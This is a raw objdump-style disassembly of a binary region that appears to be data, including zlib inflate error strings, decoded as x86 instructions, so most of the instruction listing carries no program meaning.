   1e739:	sbb    dl,BYTE PTR [ecx+ecx*1-0x57]
   1e73d:	pop    ecx
   1e73e:	jecxz  0x1e729
   1e740:	jmp    0x1e769
   1e742:	sub    BYTE PTR [eax],ch
   1e744:	fucomip st,st(6)
   1e746:	repz imul ebx,ecx,0x24c14bbb
   1e74d:	int3   
   1e74e:	add    al,0xb7
   1e750:	sti    
   1e751:	dec    eax
   1e752:	adc    BYTE PTR [ebx+ebx*2],bh
   1e755:	xchg   esp,eax
   1e756:	aaa    
   1e757:	push   esi
   1e758:	loop   0x1e717
   1e75a:	mov    edx,0x6b00c58e
   1e75f:	add    BYTE PTR [esi],cl
   1e761:	add    BYTE PTR [edi],dl
   1e763:	add    BYTE PTR [eax+eax*1],bl
   1e766:	or     eax,DWORD PTR [eax]
   1e768:	or     DWORD PTR [eax],eax
   1e76a:	pop    edi
   1e76b:	add    BYTE PTR [ecx],al
   1e76d:	add    BYTE PTR [eax+eax*1],bl
   1e770:	dec    edx
   1e771:	add    BYTE PTR [eax],cl
   1e773:	add    BYTE PTR [eax],al
   1e775:	add    BYTE PTR [eax],al
   1e777:	add    BYTE PTR [ebx-0x773b657d],dl
   1e77d:	jmp    0x68415812
   1e782:	test   BYTE PTR [esi+0x2c0067f5],bh
   1e788:	mov    es,ebx
   1e78a:	lods   eax,DWORD PTR ds:[esi]
   1e78b:	ror    BYTE PTR [esi-0x56dc853e],1
   1e791:	xchg   BYTE PTR ds:0x7a13,dl
   1e796:	jne    0x1e7e5
   1e798:	jno    0x1e7ff
   1e79a:	mov    ah,0x3c
   1e79c:	scas   eax,DWORD PTR es:[edi]
   1e79d:	sub    ebp,DWORD PTR [eax+0x4dcac971]
   1e7a3:	nop
   1e7a4:	inc    di
   1e7a6:	stc    
   1e7a7:	fwait
   1e7a8:	xchg   edx,eax
   1e7a9:	cmp    eax,0x349e54
   1e7ae:	outs   dx,DWORD PTR ds:[esi]
   1e7af:	push   ds
   1e7b0:	xor    BYTE PTR [esi],0x0
   1e7b3:	int3   
   1e7b4:	outs   dx,BYTE PTR ds:[esi]
   1e7b5:	sbb    dl,BYTE PTR [eax]
   1e7b7:	or     BYTE PTR [eax],al
   1e7b9:	inc    edx
   1e7ba:	dec    edx
   1e7bb:	or     BYTE PTR [eax],al
   1e7bd:	add    BYTE PTR ds:0x52df5034,ah
   1e7c3:	mov    edx,0x201b7228
   1e7c8:	xchg   edi,eax
   1e7c9:	(bad)  
   1e7ca:	adc    al,al
   1e7cc:	pop    ds
   1e7cd:	mov    ch,0xb1
   1e7cf:	push   0x7e
   1e7d1:	sub    al,0x5e
   1e7d3:	imul   esp,DWORD PTR [edi+eiz*2],0x5641a35b
   1e7da:	aas    
   1e7db:	repnz or al,0x8b
   1e7de:	dec    ebp
   1e7df:	mov    al,ds:0x7ae7d1ad
   1e7e4:	cmp    edi,DWORD PTR [ebx+ebx*2+0x78da4cd5]
   1e7eb:	mov    ds:0x3bd11af1,eax
   1e7f0:	add    ah,cl
   1e7f2:	pop    esp
   1e7f3:	add    BYTE PTR [edi],cl
   1e7f5:	add    BYTE PTR [edx],ch
   1e7f7:	add    BYTE PTR [edx],cl
   1e7f9:	add    BYTE PTR [edi],al
   1e7fb:	add    BYTE PTR [ecx],dl
   1e7fd:	add    BYTE PTR [eax],cl
   1e7ff:	add    BYTE PTR [edi],bh
   1e801:	add    BYTE PTR ds:0x1b000000,bh
   1e807:	add    BYTE PTR [eax],ch
   1e809:	add    BYTE PTR [edi],ch
   1e80b:	add    BYTE PTR [edx],cl
   1e80d:	add    BYTE PTR [edx],cl
   1e80f:	add    BYTE PTR [edi],al
   1e811:	add    BYTE PTR [ecx],dl
   1e813:	add    BYTE PTR [eax],cl
   1e815:	add    BYTE PTR [esi+0x0],bl
   1e818:	add    DWORD PTR [eax],eax
   1e81a:	outs   dx,BYTE PTR ds:[esi]
   1e81b:	add    BYTE PTR [eax],al
   1e81d:	add    BYTE PTR [ecx],bh
   1e81f:	mov    ch,0xaf
   1e821:	jmp    0xec02e751
   1e826:	or     al,0x98
   1e828:	inc    edx
   1e829:	xor    al,0xb5
   1e82b:	lahf   
   1e82c:	adc    BYTE PTR [eax+ebp*4+0x1e],dl
   1e830:	push   ds
   1e831:	call   0xacdb9834
   1e836:	dec    esi
   1e837:	(bad)  
   1e838:	(bad)  
   1e839:	jg     0x1e827
   1e83b:	mov    eax,0xc5d083f1
   1e840:	xchg   esi,eax
   1e841:	scas   al,BYTE PTR es:[edi]
   1e842:	add    al,0x0
   1e844:	iret   
   1e845:	ror    BYTE PTR [ebx],0x27
   1e848:	int3   
   1e849:	in     al,dx
   1e84a:	call   0x1507:0x5a0e7a54
   1e851:	js     0x1e80a
   1e853:	add    BYTE PTR ds:0x6ed6627,ch
   1e859:	mov    dl,0x96
   1e85b:	or     BYTE PTR [eax+eax*4+0x8],ah
   1e85f:	sbb    BYTE PTR [ebp+0x6f],dh
   1e862:	pop    ecx
   1e863:	leave  
   1e864:	imul   eax,DWORD PTR [edx-0x2c],0x9304b7e7
   1e86b:	xchg   edi,eax
   1e86c:	imul   edx,DWORD PTR [edi+ecx*1],0xad65a8cc
   1e873:	xor    eax,0x8eaf7a3f
   1e878:	dec    BYTE PTR [ebx-0x50d58d45]
   1e87e:	mov    ebp,0xfacc00f9
   1e883:	sti    
   1e884:	adc    esp,DWORD PTR [esp+esi*4+0x46]
   1e888:	pop    ebp
   1e88a:	add    eax,0xf5443ef0
   1e88f:	dec    ebx
   1e890:	pop    ebx
   1e891:	and    edx,DWORD PTR [esi]
   1e893:	jge    0x1e84f
   1e895:	mov    ch,al
   1e897:	lahf   
   1e898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e899:	mov    dh,BYTE PTR [eax+0x5f602ddf]
   1e89f:	scas   al,BYTE PTR es:[edi]
   1e8a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1e8a1:	outs   dx,BYTE PTR ds:[esi]
   1e8a2:	sti    
   1e8a3:	jnp    0x1e919
   1e8a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1e8a6:	sub    ebx,DWORD PTR [ebp+0x3c73659c]
   1e8ac:	adc    BYTE PTR [ebp+edi*1-0x2b610ba7],0xd7
   1e8b4:	add    ah,cl
   1e8b6:	add    BYTE PTR cs:[ebp+0x0],bl
   1e8ba:	or     al,BYTE PTR [eax]
   1e8bc:	or     al,BYTE PTR [eax]
   1e8be:	add    BYTE PTR [eax],al
   1e8c0:	mov    bh,0x63
   1e8c2:	cmp    eax,0x4769704
   1e8c7:	pop    eax
   1e8c8:	nop
   1e8c9:	inc    ebp
   1e8ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1e8cb:	sar    DWORD PTR [esi+0x3f51d56e],0xf4
   1e8d2:	cmp    eax,0x15e1f082
   1e8d7:	into   
   1e8d8:	loope  0x1e8cb
   1e8da:	int3   
   1e8db:	push   ds
   1e8dc:	pop    ds
   1e8dd:	shr    ebx,cl
   1e8df:	call   0xad66ee7e
   1e8e4:	push   esi
   1e8e5:	sub    eax,0xa01b642a
   1e8ea:	gs adc al,0x0
   1e8ed:	int3   
   1e8ee:	lahf   
   1e8ef:	dec    ebx
   1e8f0:	mov    esi,0x9c99d0df
   1e8f5:	in     al,dx
   1e8f6:	stos   BYTE PTR es:[edi],al
   1e8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e8f8:	addr16 ret 0x584
   1e8fc:	add    DWORD PTR es:[edi],edx
   1e8ff:	dec    edx
   1e900:	ja     0x1e956
   1e902:	fistp  QWORD PTR [eax+0x7cb07d0e]
   1e908:	add    al,0x94
   1e90a:	in     al,dx
   1e90b:	not    ch
   1e90d:	push   es
   1e90e:	shl    esp,1
   1e910:	inc    edx
   1e911:	loopne 0x1e928
   1e913:	aad    0xf8
   1e915:	test   eax,0x7166a27c
   1e91a:	jmp    0xba6f94
   1e91f:	int3   
   1e920:	pop    esp
   1e921:	add    BYTE PTR [edi],cl
   1e923:	add    BYTE PTR [edx],ch
   1e925:	add    BYTE PTR [edx],cl
   1e927:	add    BYTE PTR [edi],al
   1e929:	add    BYTE PTR [ecx],dl
   1e92b:	add    BYTE PTR [eax],cl
   1e92d:	add    BYTE PTR [edi],bh
   1e92f:	add    BYTE PTR ds:0x1b000000,bh
   1e935:	add    BYTE PTR [eax],al
   1e937:	add    BYTE PTR [edx+0x49615fee],al
   1e93d:	sub    BYTE PTR [eax],cl
   1e93f:	fcmovb st,st(4)
   1e941:	and    ah,BYTE PTR [edx+0x58df233a]
   1e947:	add    eax,0x21063b01
   1e94c:	dec    esp
   1e94d:	nop
   1e94e:	mov    edi,DWORD PTR [ecx+esi*1-0x39]
   1e952:	fsubrp st(1),st
   1e954:	loop   0x1e8e0
   1e956:	inc    ecx
   1e957:	scas   al,BYTE PTR es:[edi]
   1e958:	leave  
   1e959:	cmp    dh,BYTE PTR [ecx+0x78425f6d]
   1e95f:	loop   0x1e945
   1e961:	jecxz  0x1e986
   1e963:	dec    ebp
   1e964:	push   0x385fe40d
   1e969:	jae    0x1e950
   1e96b:	ret    
   1e96c:	add    ah,cl
   1e96e:	pop    esp
   1e96f:	add    BYTE PTR [esi],cl
   1e971:	add    BYTE PTR [edi],dh
   1e973:	add    BYTE PTR [edx],al
   1e975:	add    BYTE PTR [esi],cl
   1e977:	add    BYTE PTR [edx],bl
   1e979:	add    BYTE PTR [edi],al
   1e97b:	add    BYTE PTR [esi],al
   1e97d:	add    BYTE PTR [ebx],cl
   1e97f:	add    BYTE PTR ds:0x2c001100,ah
   1e985:	add    BYTE PTR [edx],al
   1e987:	add    BYTE PTR [ebx],cl
   1e989:	add    BYTE PTR [ecx],al
   1e98b:	add    BYTE PTR [edi],al
   1e98d:	add    BYTE PTR [ebx],cl
   1e98f:	add    BYTE PTR [ecx],bh
   1e991:	add    BYTE PTR [edi],cl
   1e993:	add    BYTE PTR [edx],cl
   1e995:	add    BYTE PTR [edx],cl
   1e997:	add    BYTE PTR [edi],al
   1e999:	add    BYTE PTR [ecx],dl
   1e99b:	add    BYTE PTR [eax],cl
   1e99d:	add    BYTE PTR [ecx],dl
   1e99f:	add    BYTE PTR [edi],bl
   1e9a1:	add    BYTE PTR [esi],dh
   1e9a3:	add    BYTE PTR [edi],al
   1e9a5:	add    BYTE PTR [eax],al
   1e9a7:	add    BYTE PTR [edi],dl
   1e9a9:	add    BYTE PTR [ebx],cl
   1e9ab:	add    BYTE PTR [edx],bl
   1e9ad:	add    BYTE PTR [edi],dh
   1e9af:	add    BYTE PTR [eax+eax*1],ch
   1e9b2:	add    DWORD PTR [eax],eax
   1e9b4:	sbb    al,BYTE PTR [eax]
   1e9b6:	push   es
   1e9b7:	add    BYTE PTR ds:0x3f000300,bl
   1e9bd:	add    BYTE PTR [esi],dh
   1e9bf:	add    BYTE PTR [ecx],dl
   1e9c1:	add    BYTE PTR [eax],ch
   1e9c3:	add    BYTE PTR [edi],cl
   1e9c5:	add    BYTE PTR [esi],dh
   1e9c7:	add    BYTE PTR [edi],dl
   1e9c9:	add    BYTE PTR [eax+eax*1],al
   1e9cc:	pop    ds
   1e9cd:	add    BYTE PTR [edx],cl
   1e9cf:	add    BYTE PTR [esi],al
   1e9d1:	add    BYTE PTR [esi],dl
   1e9d3:	add    BYTE PTR [edi],ch
   1e9d5:	add    BYTE PTR [eax],al
   1e9d7:	add    BYTE PTR [esi+ebx*1],bh
   1e9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1e9db:	shl    DWORD PTR [ecx],cl
   1e9dd:	xchg   edx,eax
   1e9de:	ds jne 0x1e9b4
   1e9e1:	es loope 0x1ea19
   1e9e4:	or     BYTE PTR [eax+0x65],al
   1e9e7:	xor    dl,bh
   1e9e9:	add    al,0xa5
   1e9eb:	jae    0x1e99d
   1e9ed:	imul   eax,ebp,0xf2fee00b
   1e9f3:	and    ah,BYTE PTR [ecx]
   1e9f5:	inc    esi
   1e9f6:	adc    eax,0xa5917c04
   1e9fb:	dec    edi
   1e9fc:	mov    DWORD PTR ds:0xdba6886,ecx
   1ea02:	sub    dh,al
   1ea04:	add    ah,cl
   1ea06:	ins    BYTE PTR es:[edi],dx
   1ea07:	add    BYTE PTR [edi],bl
   1ea09:	add    BYTE PTR [edx],dl
   1ea0b:	add    BYTE PTR [edx],dl
   1ea0d:	add    BYTE PTR [eax],al
   1ea0f:	add    BYTE PTR [ebp+0x0],bl
   1ea12:	dec    ebx
   1ea13:	add    BYTE PTR ds:0x1d00,bl
   1ea19:	add    BYTE PTR [esi],bh
   1ea1b:	cdq    
   1ea1c:	and    esi,DWORD PTR [ecx]
   1ea1e:	adc    eax,0xb48a1f4a
   1ea23:	cs jmp 0xc3fa2bbf
   1ea29:	popa   
   1ea2a:	inc    ebp
   1ea2b:	pop    ebp
   1ea2c:	push   ds
   1ea2d:	icebp  
   1ea2e:	js     0x1e9f0
   1ea30:	fadd   QWORD PTR [ecx]
   1ea32:	push   0xad5c8dbd
   1ea37:	or     al,0x9
   1ea39:	mov    bl,0xc2
   1ea3b:	adc    ebx,edx
   1ea3d:	lahf   
   1ea3e:	mov    ecx,0xd875c49f
   1ea43:	or     eax,0xc1ee29fd
   1ea48:	mov    edi,0x9fc9ae3
   1ea4d:	inc    ebx
   1ea4e:	cmp    al,0xa2
   1ea50:	pop    ds
   1ea51:	ins    BYTE PTR es:[edi],dx
   1ea52:	xchg   esp,eax
   1ea53:	and    edi,ebx
   1ea55:	add    al,BYTE PTR [eax]
   1ea57:	int3   
   1ea58:	pop    edx
   1ea59:	sub    eax,0x6163725
   1ea5e:	sbb    BYTE PTR [eax],cl
   1ea60:	xor    DWORD PTR [edx+ebx*1],edi
   1ea63:	pop    ss
   1ea64:	add    al,0x5
   1ea66:	add    ah,cl
   1ea68:	sub    edx,eax
   1ea6a:	inc    edx
   1ea6b:	sub    BYTE PTR [esi+ecx*1-0x8b65ee],ah
   1ea72:	sbb    esi,DWORD PTR [esi-0x29dd3aaa]
   1ea78:	fisub  DWORD PTR [ecx+0x2d]
   1ea7b:	test   DWORD PTR [edx-0x1e9a35de],ecx
   1ea81:	fstp   QWORD PTR [eax+0x5a]
   1ea84:	rol    edx,0xa1
   1ea87:	ror    BYTE PTR [esi],1
   1ea89:	arpl   WORD PTR [ecx+ecx*2+0x2a],si
   1ea8d:	mov    edi,0xb80e348d
   1ea92:	rol    BYTE PTR [ecx+0xf],cl
   1ea95:	dec    ebp
   1ea96:	jmp    0x1eb0b
   1ea98:	and    BYTE PTR [ecx],bh
   1ea9a:	ret    
   1ea9b:	add    BYTE PTR [esi+0x3a],cl
   1ea9e:	and    esp,DWORD PTR ds:0x33111d1b
   1eaa4:	aas    
   1eaa5:	sbb    eax,DWORD PTR [esi]
   1eaa7:	add    DWORD PTR [ecx*1+0x2082821],edx
   1eaae:	sbb    eax,0xfcc000b
   1eab3:	mov    bh,0x41
   1eab5:	jmp    0x1ea57
   1eab7:	lds    ebx,FWORD PTR [esi]
   1eab9:	inc    ecx
   1eaba:	aas    
   1eabb:	pop    esi
   1eabc:	xchg   edx,eax
   1eabd:	(bad)  [esi]
   1eabf:	cld    
   1eac0:	mov    esp,0xe89a750f
   1eac5:	neg    BYTE PTR [eax+edi*4]
   1eac8:	repz jns 0x1eae3
   1eacb:	sti    
   1eacc:	ss push esi
   1eace:	das    
   1eacf:	mov    edi,0xcc005f38
   1ead4:	pop    edx
   1ead5:	sub    eax,0x1b1d2227
   1eada:	adc    DWORD PTR [esi],eax
   1eadc:	pop    ss
   1eadd:	and    bh,BYTE PTR [edi]
   1eadf:	sbb    eax,DWORD PTR [esi]
   1eae1:	add    DWORD PTR [ecx*1+0x2082821],edx
   1eae8:	sbb    eax,0xd0cc000b
   1eaed:	inc    esi
   1eaee:	out    dx,eax
   1eaef:	adc    eax,0x44037da4
   1eaf4:	mov    al,0x23
   1eaf6:	addr16 iret 
   1eaf8:	in     eax,dx
   1eaf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1eafa:	in     al,0x83
   1eafc:	(bad)  
   1eafd:	push   edx
   1eafe:	inc    edi
   1eaff:	inc    ecx
   1eb00:	cwde   
   1eb01:	xor    ebx,DWORD PTR [ecx-0x6a]
   1eb04:	bnd jbe 0x1eb7b
   1eb07:	cmp    al,0x6d
   1eb09:	mov    ebx,0x5cc62121
   1eb0e:	test   DWORD PTR [esp+ecx*4-0x2c],ecx
   1eb12:	pusha  
   1eb13:	ins    BYTE PTR es:[edi],dx
   1eb14:	sti    
   1eb15:	push   esp
   1eb16:	add    ah,cl
   1eb18:	xchg   esi,eax
   1eb19:	add    esp,edx
   1eb1b:	in     al,dx
   1eb1c:	dec    esp
   1eb1d:	cli    
   1eb1e:	jmp    0xdd05979e
   1eb23:	ret    
   1eb24:	or     BYTE PTR [esi],ch
   1eb26:	jne    0x1eafe
   1eb28:	(bad)  
   1eb29:	iret   
   1eb2a:	call   0xfa04:0x154b7937
   1eb31:	sahf   
   1eb32:	or     DWORD PTR [ebp-0x69],eax
   1eb35:	pop    ecx
   1eb36:	push   eax
   1eb37:	push   esi
   1eb38:	in     eax,dx
   1eb39:	mov    edi,0x5b955014
   1eb3e:	xchg   esi,eax
   1eb3f:	mov    DWORD PTR [eax],eax
   1eb41:	int3   
   1eb42:	pop    esp
   1eb43:	add    BYTE PTR [eax],bl
   1eb45:	add    BYTE PTR [ebx],ch
   1eb47:	add    BYTE PTR [eax+eax*1],bl
   1eb4a:	aaa    
   1eb4b:	add    BYTE PTR [ecx],ah
   1eb4d:	add    BYTE PTR [ebx],dl
   1eb4f:	add    BYTE PTR [edi],bl
   1eb51:	add    BYTE PTR [edx],cl
   1eb53:	add    BYTE PTR [esi],al
   1eb55:	add    BYTE PTR [esi],dl
   1eb57:	add    BYTE PTR [edi],ch
   1eb59:	add    BYTE PTR [ecx+0x0],bh
   1eb5c:	push   esi
   1eb5d:	add    BYTE PTR [eax],al
   1eb5f:	add    ah,dl
   1eb61:	in     al,0x75
   1eb63:	add    DWORD PTR [esi+edx*8],edi
   1eb66:	icebp  
   1eb67:	mov    gs,WORD PTR [eax-0x511ae6d5]
   1eb6d:	xchg   ecx,eax
   1eb6e:	fstp   TBYTE PTR [edi-0x19f9e8ed]
   1eb74:	in     al,dx
   1eb75:	jne    0x1eb89
   1eb77:	icebp  
   1eb78:	gs loopne 0x1eb68
   1eb7b:	cmp    BYTE PTR [ebp+0x1d3d998a],0x0
   1eb82:	pop    esp
   1eb83:	add    BYTE PTR [eax],bl
   1eb85:	add    BYTE PTR [ecx],ah
   1eb87:	add    BYTE PTR [ebx],dl
   1eb89:	add    BYTE PTR [edi],bl
   1eb8b:	add    BYTE PTR [edx],cl
   1eb8d:	add    BYTE PTR [esi],al
   1eb8f:	add    BYTE PTR [ecx],bh
   1eb91:	add    BYTE PTR [ecx+0x0],bh
   1eb94:	push   esi
   1eb95:	add    BYTE PTR [eax],al
   1eb97:	add    BYTE PTR [edi+ebx*4-0x80],dl
   1eb9b:	inc    esp
   1eb9c:	adc    ebp,ebp
   1eb9e:	nop
   1eb9f:	imul   ebx,DWORD PTR [edx+0x412a26fb],0xfae3d81e
   1eba9:	aas    
   1ebaa:	sahf   
   1ebab:	fistp  WORD PTR [ebx+0x27]
   1ebae:	dec    edi
   1ebaf:	mov    dh,0x25
   1ebb1:	sub    bl,bh
   1ebb3:	dec    esp
   1ebb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1ebb5:	and    al,0x39
   1ebb7:	adc    eax,0x2598fe04
   1ebbc:	outs   dx,DWORD PTR ds:[esi]
   1ebbd:	enter  0x6b7,0xa7
   1ebc1:	sbb    edi,DWORD PTR [ecx-0x6c]
   1ebc4:	fs cmc 
   1ebc6:	les    ecx,FWORD PTR [ecx+0x176aaba2]
   1ebcc:	add    ah,cl
   1ebce:	push   ebx
   1ebcf:	add    BYTE PTR [ecx+0x0],bh
   1ebd2:	jae    0x1ebd4
   1ebd4:	inc    ebp
   1ebd5:	add    BYTE PTR [esi+0x0],dh
   1ebd8:	je     0x1ebda
   1ebda:	inc    ebx
   1ebdb:	add    BYTE PTR [eax],al
   1ebdd:	add    BYTE PTR [eax+eax*1+0x0],bl
   1ebe1:	add    BYTE PTR [edx+0x0],dh
   1ebe4:	jb     0x1ebe6
   1ebe6:	add    BYTE PTR [eax],al
   1ebe8:	mov    ecx,DWORD PTR [ecx]
   1ebea:	inc    edx
   1ebeb:	sbb    eax,0x2a301672
   1ebf0:	cmp    eax,0xc7328d9f
   1ebf5:	add    cl,BYTE PTR [esi]
   1ebf7:	xor    al,0x8f
   1ebf9:	sti    
   1ebfa:	jg     0x1eb93
   1ebfc:	push   es
   1ebfd:	(bad)  
   1ebfe:	pop    ebp
   1ebff:	(bad)  
   1ec00:	jmp    0x1ec6d
   1ec02:	dec    esi
   1ec03:	and    dh,BYTE PTR [edi]
   1ec05:	div    BYTE PTR [esp+edx*8+0x50607259]
   1ec0c:	add    al,0x27
   1ec0e:	(bad)  
   1ec0f:	scas   al,BYTE PTR es:[edi]
   1ec10:	inc    ebp
   1ec11:	out    0x82,eax
   1ec13:	outs   dx,BYTE PTR ds:[esi]
   1ec14:	add    ah,cl
   1ec16:	and    eax,0x5ccc0053
   1ec1b:	add    BYTE PTR [ebx+0x0],dh
   1ec1e:	jns    0x1ec20
   1ec20:	jae    0x1ec22
   1ec22:	je     0x1ec24
   1ec24:	add    BYTE PTR gs:[ebp+0x0],ch
   1ec28:	jb     0x1ec2a
   1ec2a:	outs   dx,DWORD PTR ds:[esi]
   1ec2b:	add    BYTE PTR [edi+0x0],ch
   1ec2e:	je     0x1ec30
   1ec30:	pop    esp
   1ec31:	add    BYTE PTR [ebx+0x0],dh
   1ec34:	jns    0x1ec36
   1ec36:	jae    0x1ec38
   1ec38:	je     0x1ec3a
   1ec3a:	add    BYTE PTR gs:[ebp+0x0],ch
   1ec3e:	xor    eax,DWORD PTR [eax]
   1ec40:	xor    al,BYTE PTR [eax]
   1ec42:	pop    esp
   1ec43:	add    BYTE PTR ds:0x5300,ah
   1ec49:	add    BYTE PTR [ecx],dh
   1ec4b:	xor    ch,BYTE PTR cs:[esi]
   1ec4e:	xor    eax,DWORD PTR [eax]
   1ec50:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ec57:	arpl   WORD PTR [eax+eiz*1+0x6c],si
   1ec5b:	outs   dx,BYTE PTR gs:[esi]
   1ec5d:	addr16 je 0x1ecc8
   1ec60:	and    BYTE PTR [ebx+0x68],ah
   1ec63:	arpl   WORD PTR gs:[ebx+0x0],bp
   1ec67:	int3   
   1ec68:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ec6f:	arpl   WORD PTR [eax+eiz*1+0x64],si
   1ec73:	popa   
   1ec74:	je     0x1ecd7
   1ec76:	and    BYTE PTR [ebx+0x68],ah
   1ec79:	arpl   WORD PTR gs:[ebx+0x0],bp
   1ec7d:	int3   
   1ec7e:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ec85:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ec89:	je     0x1ecec
   1ec8b:	outs   dx,BYTE PTR ds:[esi]
   1ec8c:	arpl   WORD PTR [ebp+0x20],sp
   1ec8f:	je     0x1ed00
   1ec91:	outs   dx,DWORD PTR ds:[esi]
   1ec92:	and    BYTE PTR [esi+0x61],ah
   1ec95:	jb     0x1ecb7
   1ec97:	bound  esp,QWORD PTR [ecx+0x63]
   1ec9a:	imul   eax,DWORD PTR [eax],0x69
   1ec9d:	outs   dx,BYTE PTR ds:[esi]
   1ec9e:	jbe    0x1ed01
   1eca0:	ins    BYTE PTR es:[edi],dx
   1eca1:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1eca9:	outs   dx,BYTE PTR ds:[esi]
   1ecaa:	arpl   WORD PTR [ebp+0x20],sp
   1ecad:	arpl   WORD PTR [edi+0x64],bp
   1ecb0:	add    BYTE PTR gs:[ecx+0x6e],ch
   1ecb4:	jbe    0x1ed17
   1ecb6:	ins    BYTE PTR es:[edi],dx
   1ecb7:	imul   esp,DWORD PTR [eax+eiz*1+0x6c],0x72657469
   1ecbf:	popa   
   1ecc0:	ins    BYTE PTR es:[edi],dx
   1ecc1:	das    
   1ecc2:	ins    BYTE PTR es:[edi],dx
   1ecc3:	outs   dx,BYTE PTR gs:[esi]
   1ecc5:	addr16 je 0x1ed30
   1ecc8:	and    BYTE PTR [ebx+0x6f],ah
   1eccb:	fs add BYTE PTR gs:[ecx+0x6e],ch
   1ecd0:	jbe    0x1ed33
   1ecd2:	ins    BYTE PTR es:[edi],dx
   1ecd3:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ecdb:	outs   dx,BYTE PTR ds:[esi]
   1ecdc:	arpl   WORD PTR [ebp+0x73],sp
   1ecdf:	and    BYTE PTR [ebx+0x65],dh
   1ece2:	je     0x1ece4
   1ece4:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1eceb:	and    BYTE PTR [ecx+ebp*2+0x74],ch
   1ecef:	gs jb  0x1ed53
   1ecf2:	ins    BYTE PTR es:[edi],dx
   1ecf3:	das    
   1ecf4:	ins    BYTE PTR es:[edi],dx
   1ecf5:	outs   dx,BYTE PTR gs:[esi]
   1ecf7:	addr16 je 0x1ed62
   1ecfa:	jae    0x1ed1c
   1ecfc:	jae    0x1ed63
   1ecfe:	je     0x1ed00
   1ed00:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed07:	and    BYTE PTR [edx+0x69],ah
   1ed0a:	je     0x1ed2c
   1ed0c:	ins    BYTE PTR es:[edi],dx
   1ed0d:	outs   dx,BYTE PTR gs:[esi]
   1ed0f:	addr16 je 0x1ed7a
   1ed12:	and    BYTE PTR [edx+0x65],dh
   1ed15:	jo     0x1ed7c
   1ed17:	popa   
   1ed18:	je     0x1ed1a
   1ed1a:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed21:	and    BYTE PTR [ebx+0x6f],ah
   1ed24:	fs and BYTE PTR gs:[ebp+eiz*2+0x6e],ch
   1ed2a:	addr16 je 0x1ed95
   1ed2d:	jae    0x1ed4f
   1ed2f:	jae    0x1ed96
   1ed31:	je     0x1ed33
   1ed33:	int3   
   1ed34:	je     0x1eda5
   1ed36:	outs   dx,DWORD PTR ds:[esi]
   1ed37:	and    BYTE PTR [ebp+0x61],ch
   1ed3a:	outs   dx,BYTE PTR ds:[esi]
   1ed3b:	jns    0x1ed5d
   1ed3d:	ins    BYTE PTR es:[edi],dx
   1ed3e:	outs   dx,BYTE PTR gs:[esi]
   1ed40:	addr16 je 0x1edab
   1ed43:	and    BYTE PTR [edi+0x72],ch
   1ed46:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ed4a:	je     0x1edad
   1ed4c:	outs   dx,BYTE PTR ds:[esi]
   1ed4d:	arpl   WORD PTR [ebp+0x20],sp
   1ed50:	jae    0x1edcb
   1ed52:	ins    DWORD PTR es:[edi],dx
   1ed53:	bound  ebp,QWORD PTR [edi+0x6c]
   1ed56:	jae    0x1ed58
   1ed58:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed5f:	and    BYTE PTR [ebx+0x74],dh
   1ed62:	outs   dx,DWORD PTR ds:[esi]
   1ed63:	jb     0x1edca
   1ed65:	and    BYTE PTR fs:[edx+0x6c],ah
   1ed69:	outs   dx,DWORD PTR ds:[esi]
   1ed6a:	arpl   WORD PTR [ebx+0x20],bp
   1ed6d:	ins    BYTE PTR es:[edi],dx
   1ed6e:	outs   dx,BYTE PTR gs:[esi]
   1ed70:	addr16 je 0x1eddb
   1ed73:	jae    0x1ed75
   1ed75:	int3   
   1ed76:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed7d:	and    BYTE PTR [edx+0x6c],ah
   1ed80:	outs   dx,DWORD PTR ds:[esi]
   1ed81:	arpl   WORD PTR [ebx+0x20],bp
   1ed84:	je     0x1edff
   1ed86:	jo     0x1eded
   1ed88:	add    ah,cl
   1ed8a:	push   0x65646165
   1ed8f:	jb     0x1edb1
   1ed91:	arpl   WORD PTR [edx+0x63],si
   1ed94:	and    BYTE PTR [ebp+0x69],ch
   1ed97:	jae    0x1ee06
   1ed99:	popa   
   1ed9a:	je     0x1edff
   1ed9c:	push   0x6b6e7500
   1eda1:	outs   dx,BYTE PTR ds:[esi]
   1eda2:	outs   dx,DWORD PTR ds:[esi]
   1eda3:	ja     0x1ee13
   1eda5:	and    BYTE PTR [eax+0x65],ch
   1eda8:	popa   
   1eda9:	fs gs jb 0x1edcd
   1edad:	data16 ins BYTE PTR es:[edi],dx
   1edaf:	popa   
   1edb0:	addr16 jae 0x1edd3
   1edb3:	jae    0x1ee1a
   1edb5:	je     0x1edb7
   1edb7:	int3   
   1edb8:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1edbf:	arpl   WORD PTR [eax+eiz*1+0x68],si
   1edc3:	gs popa 
   1edc5:	fs gs jb 0x1ede9
   1edc9:	arpl   WORD PTR [eax+0x65],bp
   1edcc:	arpl   WORD PTR [ebx+0x0],bp
   1edcf:	int3   
   1edd0:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1edd7:	and    BYTE PTR [edi+0x69],dh
   1edda:	outs   dx,BYTE PTR ds:[esi]
   1eddb:	outs   dx,DWORD PTR fs:[esi]
   1eddd:	ja     0x1edff
   1eddf:	jae    0x1ee4a
   1ede1:	jp     0x1ee48
   1ede3:	add    BYTE PTR [ebp+0x6e],dh
   1ede6:	imul   ebp,DWORD PTR [esi+0x6f],0x77
   1edea:	outs   dx,BYTE PTR ds:[esi]
